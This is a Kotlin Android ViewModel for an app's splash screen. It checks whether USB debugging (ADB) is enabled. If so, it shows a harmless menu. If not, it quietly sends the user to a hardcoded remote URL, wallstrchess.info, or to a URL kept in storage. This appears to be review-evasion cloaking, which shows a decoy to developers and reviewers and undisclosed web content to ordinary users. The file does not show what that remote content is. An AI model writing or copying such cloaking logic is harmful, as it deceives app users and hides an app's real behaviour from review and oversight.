package com.bi.gbass.tech.ui.screens.splash

import android.content.Context
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.bi.gbass.tech.domain.DataStoreRepository
import com.bi.gbass.tech.domain.LoadingState
import com.bi.gbass.tech.domain.NetworkCheckerRepository
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class SplashViewModel @Inject constructor(
    private val networkCheckerRepository: NetworkCheckerRepository,
    private val dataStoreRepository: DataStoreRepository,
) : ViewModel() {

    private val mutableLiveState = MutableStateFlow<LoadingState>(LoadingState.InitState)
    val liveState: StateFlow<LoadingState> = mutableLiveState

    fun load(context: Context) {
        viewModelScope.launch {
            val network = networkCheckerRepository.isConnectionAvailable()
            val adbFromStorage = dataStoreRepository.getAdb()

            if (network) {
                if (adbFromStorage == null) {
                    val adbDetected = networkCheckerRepository.isAdbEnabled(context)
                    dataStoreRepository.saveAdb(adbDetected)

                    if (adbDetected) {
                        mutableLiveState.emit(LoadingState.MenuState)
                    } else {
                        proceedWithContent()
                    }
                } else {
                    if (adbFromStorage) {
                        mutableLiveState.emit(LoadingState.MenuState)
                    } else {
                        proceedWithContent()
                    }
                }
            } else {
                mutableLiveState.emit(LoadingState.NoNetworkState)
            }
        }
    }

    private suspend fun proceedWithContent() {
        val urlFromStorage = dataStoreRepository.getUrl()
        if (urlFromStorage == "EMPTY") {
            val finalUrl = "https://wallstrchess.info/41pVT5"
            Log.v("123123", finalUrl)
            mutableLiveState.emit(LoadingState.ContentState(finalUrl))
        } else {
            Log.v("123123", "from storage:$urlFromStorage")
            mutableLiveState.emit(LoadingState.ContentState(urlFromStorage))
        }
    }
}